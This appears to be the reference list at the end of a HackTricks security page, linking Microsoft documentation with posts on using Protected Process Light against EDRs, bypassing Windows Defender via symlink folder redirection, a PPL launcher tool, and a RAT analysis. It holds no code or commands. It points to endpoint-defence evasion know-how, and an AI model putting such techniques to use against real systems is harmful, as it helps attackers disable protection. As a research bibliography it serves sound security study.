- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
